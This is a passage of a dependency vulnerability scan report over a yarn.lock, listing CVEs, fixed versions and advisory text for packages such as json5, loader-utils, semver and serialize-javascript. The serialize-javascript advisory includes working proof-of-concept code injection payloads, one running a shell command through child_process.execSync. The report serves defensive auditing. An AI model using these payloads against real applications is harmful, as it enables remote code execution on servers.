       - Discontinue use the affected grammars. (or perhaps use only those with poly vs exponential issues)
       - Attempt cherry-picking the grammar fixes into older versions...
       - Attempt using newer CDN versions of any affected languages.  (ie using an older CDN version of the library with newer CDN grammars).  Your mileage may vary.
       
       ### References
       
       - https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS
       
       ### For more information
       
       If you have any questions or comments about this advisory:
       * Open an issue: https://github.com/highlightjs/highlight.js/issues
       * Email us at [security@highlightjs.com](mailto:security@highlightjs.com)

error: Package: json5
Installed Version: 1.0.1
Vulnerability CVE-2022-46175
Severity: HIGH
Fixed Version: 2.2.2, 1.0.2
Link: [CVE-2022-46175](https://avd.aquasec.com/nvd/cve-2022-46175)
     ┌─ tests/element/yarn.lock:3210:1
     │  
3210 │ ╭ json5@^1.0.1:
3211 │ │   version "1.0.1"
3212 │ │   resolved "https://registry.yarnpkg.com/json5/-/json5-1.0.1.tgz#HIDDEN_BY_MEGALINTER"
3213 │ │   integrity sha512-aKS4WQjPenRxiQsC93MNfjx+nbF4PAdYzmd/1JIj8HYzqfbu86beTuNgXDzPknWk0n0uARlyewZo4s++ES36Ow==
3214 │ │   dependencies:
3215 │ │     minimist "^1.2.0"
     │ ╰^
     │  
     = json5: Prototype Pollution in JSON5 via Parse Method
     = JSON5 is an extension to the popular JSON file format that aims to be easier to write and maintain by hand (e.g. for config files). The `parse` method of the JSON5 library before and including versions 1.0.1 and 2.2.1 does not restrict parsing of keys named `__proto__`, allowing specially crafted strings to pollute the prototype of the resulting object. This vulnerability pollutes the prototype of the object returned by `JSON5.parse` and not the global Object prototype, which is the commonly understood definition of Prototype Pollution. However, polluting the prototype of a single object can have significant security impact for an application if the object is later used in trusted operations. This vulnerability could allow an attacker to set arbitrary and unexpected keys on the object returned from `JSON5.parse`. The actual impact will depend on how applications utilize the returned object and how they filter unwanted keys, but could include denial of service, cross-site scripting, elevation of privilege, and in extreme cases, remote code execution. `JSON5.parse` should restrict parsing of `__proto__` keys when parsing JSON strings to objects. As a point of reference, the `JSON.parse` method included in JavaScript ignores `__proto__` keys. Simply changing `JSON5.parse` to `JSON.parse` in the examples above mitigates this vulnerability. This vulnerability is patched in json5 versions 1.0.2, 2.2.2, and later.

error: Package: json5
Installed Version: 2.2.0
Vulnerability CVE-2022-46175
Severity: HIGH
Fixed Version: 2.2.2, 1.0.2
Link: [CVE-2022-46175](https://avd.aquasec.com/nvd/cve-2022-46175)
     ┌─ tests/element/yarn.lock:3217:1
     │  
3217 │ ╭ json5@^2.1.2:
3218 │ │   version "2.2.0"
3219 │ │   resolved "https://registry.yarnpkg.com/json5/-/json5-2.2.0.tgz#HIDDEN_BY_MEGALINTER"
3220 │ │   integrity sha512-f+8cldu7X/y7RAJurMEJmdoKXGB/X550w2Nr3tTbezL6RwEE/iMcm+tZnXeoZtKuOq6ft8+CqzEkrIgx1fPoQA==
3221 │ │   dependencies:
3222 │ │     minimist "^1.2.5"
     │ ╰^
     │  
     = json5: Prototype Pollution in JSON5 via Parse Method
     = JSON5 is an extension to the popular JSON file format that aims to be easier to write and maintain by hand (e.g. for config files). The `parse` method of the JSON5 library before and including versions 1.0.1 and 2.2.1 does not restrict parsing of keys named `__proto__`, allowing specially crafted strings to pollute the prototype of the resulting object. This vulnerability pollutes the prototype of the object returned by `JSON5.parse` and not the global Object prototype, which is the commonly understood definition of Prototype Pollution. However, polluting the prototype of a single object can have significant security impact for an application if the object is later used in trusted operations. This vulnerability could allow an attacker to set arbitrary and unexpected keys on the object returned from `JSON5.parse`. The actual impact will depend on how applications utilize the returned object and how they filter unwanted keys, but could include denial of service, cross-site scripting, elevation of privilege, and in extreme cases, remote code execution. `JSON5.parse` should restrict parsing of `__proto__` keys when parsing JSON strings to objects. As a point of reference, the `JSON.parse` method included in JavaScript ignores `__proto__` keys. Simply changing `JSON5.parse` to `JSON.parse` in the examples above mitigates this vulnerability. This vulnerability is patched in json5 versions 1.0.2, 2.2.2, and later.

error: Package: loader-utils
Installed Version: 1.4.0
Vulnerability CVE-2022-37601
Severity: CRITICAL
Fixed Version: 2.0.3, 1.4.1
Link: [CVE-2022-37601](https://avd.aquasec.com/nvd/cve-2022-37601)
     ┌─ tests/element/yarn.lock:3310:1
     │  
3310 │ ╭ loader-utils@^1.0.2, loader-utils@^1.2.3:
3311 │ │   version "1.4.0"
3312 │ │   resolved "https://registry.yarnpkg.com/loader-utils/-/loader-utils-1.4.0.tgz#HIDDEN_BY_MEGALINTER"
3313 │ │   integrity sha512-qH0WSMBtn/oHuwjy/NucEgbx5dbxxnxup9s4PVXJUDHZBQY+s0NWA9rJf53RBnQZxfch7euUui7hpoAPvALZdA==
     · │
3316 │ │     emojis-list "^3.0.0"
3317 │ │     json5 "^1.0.1"
     │ ╰^
     │  
     = loader-utils: prototype pollution in function parseQuery in parseQuery.js
     = Prototype pollution vulnerability in function parseQuery in parseQuery.js in webpack loader-utils via the name variable in parseQuery.js. This affects all versions prior to 1.4.1 and 2.0.3.

error: Package: loader-utils
Installed Version: 1.4.0
Vulnerability CVE-2022-37599
Severity: HIGH
Fixed Version: 1.4.2, 2.0.4, 3.2.1
Link: [CVE-2022-37599](https://avd.aquasec.com/nvd/cve-2022-37599)
     ┌─ tests/element/yarn.lock:3310:1
     │  
3310 │ ╭ loader-utils@^1.0.2, loader-utils@^1.2.3:
3311 │ │   version "1.4.0"
3312 │ │   resolved "https://registry.yarnpkg.com/loader-utils/-/loader-utils-1.4.0.tgz#HIDDEN_BY_MEGALINTER"
3313 │ │   integrity sha512-qH0WSMBtn/oHuwjy/NucEgbx5dbxxnxup9s4PVXJUDHZBQY+s0NWA9rJf53RBnQZxfch7euUui7hpoAPvALZdA==
     · │
3316 │ │     emojis-list "^3.0.0"
3317 │ │     json5 "^1.0.1"
     │ ╰^
     │  
     = loader-utils: regular expression denial of service in interpolateName.js
     = A Regular expression denial of service (ReDoS) flaw was found in Function interpolateName in interpolateName.js in webpack loader-utils 2.0.0 via the resourcePath variable in interpolateName.js.

error: Package: loader-utils
Installed Version: 1.4.0
Vulnerability CVE-2022-37603
Severity: HIGH
Fixed Version: 1.4.2, 2.0.4, 3.2.1
Link: [CVE-2022-37603](https://avd.aquasec.com/nvd/cve-2022-37603)
     ┌─ tests/element/yarn.lock:3310:1
     │  
3310 │ ╭ loader-utils@^1.0.2, loader-utils@^1.2.3:
3311 │ │   version "1.4.0"
3312 │ │   resolved "https://registry.yarnpkg.com/loader-utils/-/loader-utils-1.4.0.tgz#HIDDEN_BY_MEGALINTER"
3313 │ │   integrity sha512-qH0WSMBtn/oHuwjy/NucEgbx5dbxxnxup9s4PVXJUDHZBQY+s0NWA9rJf53RBnQZxfch7euUui7hpoAPvALZdA==
     · │
3316 │ │     emojis-list "^3.0.0"
3317 │ │     json5 "^1.0.1"
     │ ╰^
     │  
     = loader-utils: Regular expression denial of service
     = A Regular expression denial of service (ReDoS) flaw was found in Function interpolateName in interpolateName.js in webpack loader-utils 2.0.0 via the url variable in interpolateName.js.

error: Package: loader-utils
Installed Version: 2.0.2
Vulnerability CVE-2022-37601
Severity: CRITICAL
Fixed Version: 2.0.3, 1.4.1
Link: [CVE-2022-37601](https://avd.aquasec.com/nvd/cve-2022-37601)
     ┌─ tests/element/yarn.lock:3319:1
     │  
3319 │ ╭ loader-utils@^2.0.0:
3320 │ │   version "2.0.2"
3321 │ │   resolved "https://registry.yarnpkg.com/loader-utils/-/loader-utils-2.0.2.tgz#HIDDEN_BY_MEGALINTER"
3322 │ │   integrity sha512-TM57VeHptv569d/GKh6TAYdzKblwDNiumOdkFnejjD0XwTH87K90w3O7AiJRqdQoXygvi1VQTJTLGhJl7WqA7A==
     · │
3325 │ │     emojis-list "^3.0.0"
3326 │ │     json5 "^2.1.2"
     │ ╰^
     │  
     = loader-utils: prototype pollution in function parseQuery in parseQuery.js
     = Prototype pollution vulnerability in function parseQuery in parseQuery.js in webpack loader-utils via the name variable in parseQuery.js. This affects all versions prior to 1.4.1 and 2.0.3.

error: Package: loader-utils
Installed Version: 2.0.2
Vulnerability CVE-2022-37599
Severity: HIGH
Fixed Version: 1.4.2, 2.0.4, 3.2.1
Link: [CVE-2022-37599](https://avd.aquasec.com/nvd/cve-2022-37599)
     ┌─ tests/element/yarn.lock:3319:1
     │  
3319 │ ╭ loader-utils@^2.0.0:
3320 │ │   version "2.0.2"
3321 │ │   resolved "https://registry.yarnpkg.com/loader-utils/-/loader-utils-2.0.2.tgz#HIDDEN_BY_MEGALINTER"
3322 │ │   integrity sha512-TM57VeHptv569d/GKh6TAYdzKblwDNiumOdkFnejjD0XwTH87K90w3O7AiJRqdQoXygvi1VQTJTLGhJl7WqA7A==
     · │
3325 │ │     emojis-list "^3.0.0"
3326 │ │     json5 "^2.1.2"
     │ ╰^
     │  
     = loader-utils: regular expression denial of service in interpolateName.js
     = A Regular expression denial of service (ReDoS) flaw was found in Function interpolateName in interpolateName.js in webpack loader-utils 2.0.0 via the resourcePath variable in interpolateName.js.

error: Package: loader-utils
Installed Version: 2.0.2
Vulnerability CVE-2022-37603
Severity: HIGH
Fixed Version: 1.4.2, 2.0.4, 3.2.1
Link: [CVE-2022-37603](https://avd.aquasec.com/nvd/cve-2022-37603)
     ┌─ tests/element/yarn.lock:3319:1
     │  
3319 │ ╭ loader-utils@^2.0.0:
3320 │ │   version "2.0.2"
3321 │ │   resolved "https://registry.yarnpkg.com/loader-utils/-/loader-utils-2.0.2.tgz#HIDDEN_BY_MEGALINTER"
3322 │ │   integrity sha512-TM57VeHptv569d/GKh6TAYdzKblwDNiumOdkFnejjD0XwTH87K90w3O7AiJRqdQoXygvi1VQTJTLGhJl7WqA7A==
     · │
3325 │ │     emojis-list "^3.0.0"
3326 │ │     json5 "^2.1.2"
     │ ╰^
     │  
     = loader-utils: Regular expression denial of service
     = A Regular expression denial of service (ReDoS) flaw was found in Function interpolateName in interpolateName.js in webpack loader-utils 2.0.0 via the url variable in interpolateName.js.

error: Package: marked
Installed Version: 0.8.2
Vulnerability CVE-2022-21680
Severity: HIGH
Fixed Version: 4.0.10
Link: [CVE-2022-21680](https://avd.aquasec.com/nvd/cve-2022-21680)
     ┌─ tests/element/yarn.lock:3437:1
     │  
3437 │ ╭ marked@^0.8.0:
3438 │ │   version "0.8.2"
3439 │ │   resolved "https://registry.yarnpkg.com/marked/-/marked-0.8.2.tgz#HIDDEN_BY_MEGALINTER"
3440 │ │   integrity sha512-EGwzEeCcLniFX51DhTpmTom+dSA/MG/OBUDjnWtHbEnjAH180VzUeAw+oE4+Zv+CoYBWyRlYOTR0N8SO9R1PVw==
     │ ╰^
     │  
     = marked: regular expression block.def may lead Denial of Service
     = Marked is a markdown parser and compiler. Prior to version 4.0.10, the regular expression `block.def` may cause catastrophic backtracking against some strings and lead to a regular expression denial of service (ReDoS). Anyone who runs untrusted markdown through a vulnerable version of marked and does not use a worker with a time limit may be affected. This issue is patched in version 4.0.10. As a workaround, avoid running untrusted markdown through marked or run marked on a worker thread and set a reasonable time limit to prevent draining resources.

error: Package: marked
Installed Version: 0.8.2
Vulnerability CVE-2022-21681
Severity: HIGH
Fixed Version: 4.0.10
Link: [CVE-2022-21681](https://avd.aquasec.com/nvd/cve-2022-21681)
     ┌─ tests/element/yarn.lock:3437:1
     │  
3437 │ ╭ marked@^0.8.0:
3438 │ │   version "0.8.2"
3439 │ │   resolved "https://registry.yarnpkg.com/marked/-/marked-0.8.2.tgz#HIDDEN_BY_MEGALINTER"
3440 │ │   integrity sha512-EGwzEeCcLniFX51DhTpmTom+dSA/MG/OBUDjnWtHbEnjAH180VzUeAw+oE4+Zv+CoYBWyRlYOTR0N8SO9R1PVw==
     │ ╰^
     │  
     = marked: regular expression inline.reflinkSearch may lead Denial of Service
     = Marked is a markdown parser and compiler. Prior to version 4.0.10, the regular expression `inline.reflinkSearch` may cause catastrophic backtracking against some strings and lead to a denial of service (DoS). Anyone who runs untrusted markdown through a vulnerable version of marked and does not use a worker with a time limit may be affected. This issue is patched in version 4.0.10. As a workaround, avoid running untrusted markdown through marked or run marked on a worker thread and set a reasonable time limit to prevent draining resources.

warning: Package: micromatch
Installed Version: 3.1.10
Vulnerability CVE-2024-4067
Severity: MEDIUM
Fixed Version: 4.0.8
Link: [CVE-2024-4067](https://avd.aquasec.com/nvd/cve-2024-4067)
     ┌─ tests/element/yarn.lock:3542:1
     │  
3542 │ ╭ micromatch@^3.1.10, micromatch@^3.1.4:
3543 │ │   version "3.1.10"
3544 │ │   resolved "https://registry.yarnpkg.com/micromatch/-/micromatch-3.1.10.tgz#HIDDEN_BY_MEGALINTER"
3545 │ │   integrity sha512-MWikgl9n9M3w+bpsY3He8L+w9eF9338xRl8IAO5viDizwSzziFEyUzo2xrrloB64ADbTf8uA8vRqqttDTOmccg==
     · │
3558 │ │     snapdragon "^0.8.1"
3559 │ │     to-regex "^3.0.2"
     │ ╰^
     │  
     = micromatch: vulnerable to Regular Expression Denial of Service
     = The NPM package `micromatch` prior to 4.0.8 is vulnerable to Regular Expression Denial of Service (ReDoS). The vulnerability occurs in `micromatch.braces()` in `index.js` because the pattern `.*` will greedily match anything. By passing a malicious payload, the pattern matching will keep backtracking to the input while it doesn't find the closing bracket. As the input size increases, the consumption time will also increase until it causes the application to hang or slow down. There was a merged fix but further testing shows the issue persists. This issue should be mitigated by using a safe pattern that won't start backtracking the regular expression due to greedy matching. This issue was fixed in version 4.0.8.

warning: Package: micromatch
Installed Version: 4.0.4
Vulnerability CVE-2024-4067
Severity: MEDIUM
Fixed Version: 4.0.8
Link: [CVE-2024-4067](https://avd.aquasec.com/nvd/cve-2024-4067)
     ┌─ tests/element/yarn.lock:3561:1
     │  
3561 │ ╭ micromatch@^4.0.0, micromatch@^4.0.2:
3562 │ │   version "4.0.4"
3563 │ │   resolved "https://registry.yarnpkg.com/micromatch/-/micromatch-4.0.4.tgz#HIDDEN_BY_MEGALINTER"
3564 │ │   integrity sha512-pRmzw/XUcwXGpD9aI9q/0XOwLNygjETJ8y0ao0wdqprrzDa4YnxLcz7fQRZr8voh8V10kGhABbNcHVk5wHgWwg==
3565 │ │   dependencies:
3566 │ │     braces "^3.0.1"
3567 │ │     picomatch "^2.2.3"
     │ ╰^
     │  
     = micromatch: vulnerable to Regular Expression Denial of Service
     = The NPM package `micromatch` prior to 4.0.8 is vulnerable to Regular Expression Denial of Service (ReDoS). The vulnerability occurs in `micromatch.braces()` in `index.js` because the pattern `.*` will greedily match anything. By passing a malicious payload, the pattern matching will keep backtracking to the input while it doesn't find the closing bracket. As the input size increases, the consumption time will also increase until it causes the application to hang or slow down. There was a merged fix but further testing shows the issue persists. This issue should be mitigated by using a safe pattern that won't start backtracking the regular expression due to greedy matching. This issue was fixed in version 4.0.8.

error: Package: parse-duration
Installed Version: 0.1.3
Vulnerability CVE-2025-25283
Severity: HIGH
Fixed Version: 2.1.3
Link: [CVE-2025-25283](https://avd.aquasec.com/nvd/cve-2025-25283)
     ┌─ tests/element/yarn.lock:4062:1
     │  
4062 │ ╭ parse-duration@^0.1.2:
4063 │ │   version "0.1.3"
4064 │ │   resolved "https://registry.yarnpkg.com/parse-duration/-/parse-duration-0.1.3.tgz#HIDDEN_BY_MEGALINTER"
4065 │ │   integrity sha512-hMOZHfUmjxO5hMKn7Eft+ckP2M4nV4yzauLXiw3PndpkASnx5r8pDAMcOAiqxoemqWjMWmz4fOHQM6n6WwETXw==
     │ ╰^
     │  
     = parse-duration has a Regex Denial of Service that results in event loop delay and out of memory
     = parse-duraton is software that allows users to convert a human readable duration to milliseconds. Versions prior to 2.1.3 are vulnerable to an event loop delay due to the CPU-bound operation of resolving the provided string, from a 0.5ms and up to ~50ms per one operation, with a varying size from 0.01 MB and up to 4.3 MB respectively, and an out of memory that would crash a running Node.js application due to a string size of roughly 10 MB that utilizes unicode characters. Version 2.1.3 contains a patch.

error: Package: pbkdf2
Installed Version: 3.1.2
Vulnerability CVE-2025-6545
Severity: CRITICAL
Fixed Version: 3.1.3
Link: [CVE-2025-6545](https://avd.aquasec.com/nvd/cve-2025-6545)
     ┌─ tests/element/yarn.lock:4142:1
     │  
4142 │ ╭ pbkdf2@^3.0.3:
4143 │ │   version "3.1.2"
4144 │ │   resolved "https://registry.yarnpkg.com/pbkdf2/-/pbkdf2-3.1.2.tgz#HIDDEN_BY_MEGALINTER"
4145 │ │   integrity sha512-iuh7L6jA7JEGu2WxDwtQP1ddOpaJNC4KlDEFfdQajSGgGPNi4OyDc2R7QnbY2bR9QjBVGwgvTdNJZoE7RaxUMA==
     · │
4150 │ │     safe-buffer "^5.0.1"
4151 │ │     sha.js "^2.4.8"
     │ ╰^
     │  
     = pbkdf2: pbkdf2 silently returns predictable key material
     = Improper Input Validation vulnerability in pbkdf2 allows Signature Spoofing by Improper Validation. This vulnerability is associated with program files lib/to-buffer.Js.
       
       This issue affects pbkdf2: from 3.0.10 through 3.1.2.

error: Package: pbkdf2
Installed Version: 3.1.2
Vulnerability CVE-2025-6547
Severity: CRITICAL
Fixed Version: 3.1.3
Link: [CVE-2025-6547](https://avd.aquasec.com/nvd/cve-2025-6547)
     ┌─ tests/element/yarn.lock:4142:1
     │  
4142 │ ╭ pbkdf2@^3.0.3:
4143 │ │   version "3.1.2"
4144 │ │   resolved "https://registry.yarnpkg.com/pbkdf2/-/pbkdf2-3.1.2.tgz#HIDDEN_BY_MEGALINTER"
4145 │ │   integrity sha512-iuh7L6jA7JEGu2WxDwtQP1ddOpaJNC4KlDEFfdQajSGgGPNi4OyDc2R7QnbY2bR9QjBVGwgvTdNJZoE7RaxUMA==
     · │
4150 │ │     safe-buffer "^5.0.1"
4151 │ │     sha.js "^2.4.8"
     │ ╰^
     │  
     = pbkdf2: pbkdf2 silently returns static keys
     = Improper Input Validation vulnerability in pbkdf2 allows Signature Spoofing by Improper Validation.This issue affects pbkdf2: <=3.1.2.

error: Package: plist
Installed Version: 2.1.0
Vulnerability CVE-2022-22912
Severity: CRITICAL
Fixed Version: 3.0.5
Link: [CVE-2022-22912](https://avd.aquasec.com/nvd/cve-2022-22912)
     ┌─ tests/element/yarn.lock:4218:1
     │  
4218 │ ╭ plist@^2.0.1:
4219 │ │   version "2.1.0"
4220 │ │   resolved "https://registry.yarnpkg.com/plist/-/plist-2.1.0.tgz#HIDDEN_BY_MEGALINTER"
4221 │ │   integrity sha1-V8zbeggh3yGDEhejytVOPhRqECU=
     · │
4224 │ │     xmlbuilder "8.2.2"
4225 │ │     xmldom "0.1.x"
     │ ╰^
     │  
     = Prototype pollution in Plist before 3.0.5 can cause denial of service
     = Prototype pollution vulnerability via .parse() in Plist before v3.0.4 allows attackers to cause a Denial of Service (DoS) and may lead to remote code execution.

warning: Package: postcss
Installed Version: 7.0.39
Vulnerability CVE-2023-44270
Severity: MEDIUM
Fixed Version: 8.4.31
Link: [CVE-2023-44270](https://avd.aquasec.com/nvd/cve-2023-44270)
     ┌─ tests/element/yarn.lock:4283:1
     │  
4283 │ ╭ postcss@^7.0.14, postcss@^7.0.32, postcss@^7.0.5, postcss@^7.0.6:
4284 │ │   version "7.0.39"
4285 │ │   resolved "https://registry.yarnpkg.com/postcss/-/postcss-7.0.39.tgz#HIDDEN_BY_MEGALINTER"
4286 │ │   integrity sha512-yioayjNbHn6z1/Bywyb2Y4s3yvDAeXGOyxqD+LnVOinq6Mdmd++SW2wUNVzavyyHxd6+DxzWGIuosg6P1Rj8uA==
4287 │ │   dependencies:
4288 │ │     picocolors "^0.2.1"
4289 │ │     source-map "^0.6.1"
     │ ╰^
     │  
     = PostCSS: Improper input validation in PostCSS
     = An issue was discovered in PostCSS before 8.4.31. The vulnerability affects linters using PostCSS to parse external untrusted CSS. An attacker can prepare CSS in such a way that it will contains parts parsed by PostCSS as a CSS comment. After processing by PostCSS, it will be included in the PostCSS output in CSS nodes (rules, properties) despite being included in a comment.

error: Package: semver
Installed Version: 5.7.1
Vulnerability CVE-2022-25883
Severity: HIGH
Fixed Version: 7.5.2, 6.3.1, 5.7.2
Link: [CVE-2022-25883](https://avd.aquasec.com/nvd/cve-2022-25883)
     ┌─ tests/element/yarn.lock:4799:1
     │  
4799 │ ╭ "semver@2 || 3 || 4 || 5", semver@^5.5.0, semver@^5.6.0:
4800 │ │   version "5.7.1"
4801 │ │   resolved "https://registry.yarnpkg.com/semver/-/semver-5.7.1.tgz#HIDDEN_BY_MEGALINTER"
4802 │ │   integrity sha512-sauaDf/PZdVgrLTNYHRtpXa1iRiKcaebiKQ1BJdpQlWH2lCvexQdX55snPFyK7QzpudqbCI0qXFfOasHdyNDGQ==
     │ ╰^
     │  
     = nodejs-semver: Regular expression denial of service
     = Versions of the package semver before 7.5.2 are vulnerable to Regular Expression Denial of Service (ReDoS) via the function new Range, when untrusted user data is provided as a range.



error: Package: semver
Installed Version: 6.3.0
Vulnerability CVE-2022-25883
Severity: HIGH
Fixed Version: 7.5.2, 6.3.1, 5.7.2
Link: [CVE-2022-25883](https://avd.aquasec.com/nvd/cve-2022-25883)
     ┌─ tests/element/yarn.lock:4804:1
     │  
4804 │ ╭ semver@^6.0.0, semver@^6.3.0:
4805 │ │   version "6.3.0"
4806 │ │   resolved "https://registry.yarnpkg.com/semver/-/semver-6.3.0.tgz#HIDDEN_BY_MEGALINTER"
4807 │ │   integrity sha512-b39TBaTSfV6yBrapU89p5fKekE2m/NwnDocOVruQFS1/veMgdzuPcnOM34M6CwxW8jH/lxEa5rBoDeUwu5HHTw==
     │ ╰^
     │  
     = nodejs-semver: Regular expression denial of service
     = Versions of the package semver before 7.5.2 are vulnerable to Regular Expression Denial of Service (ReDoS) via the function new Range, when untrusted user data is provided as a range.



error: Package: semver
Installed Version: 7.3.5
Vulnerability CVE-2022-25883
Severity: HIGH
Fixed Version: 7.5.2, 6.3.1, 5.7.2
Link: [CVE-2022-25883](https://avd.aquasec.com/nvd/cve-2022-25883)
     ┌─ tests/element/yarn.lock:4809:1
     │  
4809 │ ╭ semver@^7.1.3, semver@^7.2.1, semver@^7.3.2, semver@^7.3.4:
4810 │ │   version "7.3.5"
4811 │ │   resolved "https://registry.yarnpkg.com/semver/-/semver-7.3.5.tgz#HIDDEN_BY_MEGALINTER"
4812 │ │   integrity sha512-PoeGJYh8HK4BTO/a9Tf6ZG3veo/A7ZVsYrSA6J8ny9nb3B1VrpkuN+z9OE5wfE5p6H4LchYZsegiQgbJD94ZFQ==
4813 │ │   dependencies:
4814 │ │     lru-cache "^6.0.0"
     │ ╰^
     │  
     = nodejs-semver: Regular expression denial of service
     = Versions of the package semver before 7.5.2 are vulnerable to Regular Expression Denial of Service (ReDoS) via the function new Range, when untrusted user data is provided as a range.



error: Package: serialize-javascript
Installed Version: 4.0.0
Vulnerability GHSA-5c6j-r48x-rmvq
Severity: HIGH
Fixed Version: 7.0.3
Link: [GHSA-5c6j-r48x-rmvq](https://github.com/advisories/GHSA-5c6j-r48x-rmvq)
     ┌─ tests/element/yarn.lock:4816:1
     │  
4816 │ ╭ serialize-javascript@^4.0.0:
4817 │ │   version "4.0.0"
4818 │ │   resolved "https://registry.yarnpkg.com/serialize-javascript/-/serialize-javascript-4.0.0.tgz#HIDDEN_BY_MEGALINTER"
4819 │ │   integrity sha512-GaNA54380uFefWghODBWEGisLZFj00nS5ACs6yHa9nLqlLpVLO8ChDGeKRjZnV4Nh4n0Qi7nhYZD/9fCPzEqkw==
4820 │ │   dependencies:
4821 │ │     randombytes "^2.1.0"
     │ ╰^
     │  
     = Serialize JavaScript is Vulnerable to RCE via RegExp.flags and Date.prototype.toISOString()
     = ### Impact
       
       The serialize-javascript npm package (versions <= 7.0.2) contains a code injection vulnerability. It is an incomplete fix for CVE-2020-7660.
       
       While `RegExp.source` is sanitized, `RegExp.flags` is interpolated directly into the generated output without escaping. A similar issue exists in `Date.prototype.toISOString()`.
       
       If an attacker can control the input object passed to `serialize()`, they can inject malicious JavaScript via the flags property of a RegExp object. When the serialized string is later evaluated (via `eval`, `new Function`, or `<script>` tags), the injected code executes.
       
       ```javascript
       const serialize = require('serialize-javascript');
       // Create an object that passes instanceof RegExp with a spoofed .flags
       const fakeRegex = Object.create(RegExp.prototype);
       Object.defineProperty(fakeRegex, 'source', { get: () => 'x' });
       Object.defineProperty(fakeRegex, 'flags', {
         get: () => '"+(global.PWNED="CODE_INJECTION_VIA_FLAGS")+"'
       });
       fakeRegex.toJSON = function() { return '@placeholder'; };
       const output = serialize({ re: fakeRegex });
       // Output: {"re":new RegExp("x", ""+(global.PWNED="CODE_INJECTION_VIA_FLAGS")+"")}
       let obj;
       eval('obj = ' + output);
       console.log(global.PWNED); // "CODE_INJECTION_VIA_FLAGS" — injected code executed!
       #h2. PoC 2: Code Injection via Date.toISOString()
       ```
       
       ```javascript
       const serialize = require('serialize-javascript');
       const fakeDate = Object.create(Date.prototype);
       fakeDate.toISOString = function() { return '"+(global.DATE_PWNED="DATE_INJECTION")+"'; };
       fakeDate.toJSON = function() { return '2024-01-01'; };
       const output = serialize({ d: fakeDate });
       // Output: {"d":new Date(""+(global.DATE_PWNED="DATE_INJECTION")+"")}
       eval('obj = ' + output);
       console.log(global.DATE_PWNED); // "DATE_INJECTION" — injected code executed!
       #h2. PoC 3: Remote Code Execution
       ```
       
       ```javascript
       const serialize = require('serialize-javascript');
       const rceRegex = Object.create(RegExp.prototype);
       Object.defineProperty(rceRegex, 'source', { get: () => 'x' });
       Object.defineProperty(rceRegex, 'flags', {
         get: () => '"+require("child_process").execSync("id").toString()+"'
       });
       rceRegex.toJSON = function() { return '@rce'; };
       const output = serialize({ re: rceRegex });
       // Output: {"re":new RegExp("x", ""+require("child_process").execSync("id").toString()+"")}
       // When eval'd on a Node.js server, executes the "id" system command
       ```
       
       ### Patches
       
       The fix has been published in version 7.0.3. https://github.com/yahoo/serialize-javascript/releases/tag/v7.0.3

warning: Package: serialize-javascript
Installed Version: 4.0.0
Vulnerability CVE-2026-34043
Severity: MEDIUM
Fixed Version: 7.0.5
Link: [CVE-2026-34043](https://avd.aquasec.com/nvd/cve-2026-34043)
     ┌─ tests/element/yarn.lock:4816:1
     │  
4816 │ ╭ serialize-javascript@^4.0.0:
4817 │ │   version "4.0.0"
4818 │ │   resolved "https://registry.yarnpkg.com/serialize-javascript/-/serialize-javascript-4.0.0.tgz#HIDDEN_BY_MEGALINTER"
4819 │ │   integrity sha512-GaNA54380uFefWghODBWEGisLZFj00nS5ACs6yHa9nLqlLpVLO8ChDGeKRjZnV4Nh4n0Qi7nhYZD/9fCPzEqkw==
4820 │ │   dependencies:
4821 │ │     randombytes "^2.1.0"
     │ ╰^
     │  
     = serialize-javascript: serialize-javascript: Denial of Service via specially crafted array-like object serialization
     = Serialize JavaScript to a superset of JSON that includes regular expressions and functions. Prior to version 7.0.5, there is a Denial of Service (DoS) vulnerability caused by CPU exhaustion. When serializing a specially crafted "array-like" object (an object that inherits from Array.prototype but has a very large length property), the process enters an intensive loop that consumes 100% CPU and hangs indefinitely. This issue has been patched in version 7.0.5.

note: Package: tmp
Installed Version: 0.0.33
Vulnerability CVE-2025-54798
Severity: LOW
Fixed Version: 0.2.4
Link: [CVE-2025-54798](https://avd.aquasec.com/nvd/cve-2025-54798)
     ┌─ tests/element/yarn.lock:5414:1
     │  
5414 │ ╭ tmp@^0.0.33:
5415 │ │   version "0.0.33"
5416 │ │   resolved "https://registry.yarnpkg.com/tmp/-/tmp-0.0.33.tgz#HIDDEN_BY_MEGALINTER"
5417 │ │   integrity sha512-jRCJlojKnZ3addtTOjdIqoRuPEKBvNXcGYqzO6zWZX8KfKEpnGY5jfggJQ3EjKuu8D4bJRr0y+cYJFmYbImXGw==
5418 │ │   dependencies:
5419 │ │     os-tmpdir "~1.0.2"
     │ ╰^
     │  
     = tmp: tmp Symbolic Link Write Vulnerability
     = tmp is a temporary file and directory creator for node.js. In versions 0.2.3 and below, tmp is vulnerable to an arbitrary temporary file / directory write via symbolic link dir parameter. This is fixed in version 0.2.4.

error: Package: unicode
Installed Version: 14.0.0
Vulnerability NSWG-ECO-161
Severity: HIGH
Fixed Version: <0.0.0
Link: [NSWG-ECO-161]()
     ┌─ tests/element/yarn.lock:5621:1
     │  
5621 │ ╭ "unicode@>= 0.3.1":
5622 │ │   version "14.0.0"
5623 │ │   resolved "https://registry.yarnpkg.com/unicode/-/unicode-14.0.0.tgz#HIDDEN_BY_MEGALINTER"
5624 │ │   integrity sha512-BjinxTXkbm9Jomp/YBTMGusr4fxIG67fNGShHIRAL16Ur2GJTq2xvLi+sxuiJmInCmwqqev2BCFKyvbfp/yAkg==
     │ ╰^
     │  
     = Downloads Resources over HTTP
     = unicode loads unicode data downloaded from unicode.org into nodejs.
       
       Unicode downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks.

error: Package: xmldom
Installed Version: 0.1.31
Vulnerability CVE-2022-39353
Severity: CRITICAL
Fixed Version: 
Link: [CVE-2022-39353](https://avd.aquasec.com/nvd/cve-2022-39353)
     ┌─ tests/element/yarn.lock:6026:1
     │  
6026 │ ╭ xmldom@0.1.x:
6027 │ │   version "0.1.31"
6028 │ │   resolved "https://registry.yarnpkg.com/xmldom/-/xmldom-0.1.31.tgz#HIDDEN_BY_MEGALINTER"
6029 │ │   integrity sha512-yS2uJflVQs6n+CyjHoaBmVSqIDevTAWrzMmjG1Gc7h1qQ7uVozNhEPJAwZXWyGQ/Gafo3fCwrcaokezLPupVyQ==
     │ ╰^
     │  
     = xmldom: Allows multiple root elements in a DOM tree
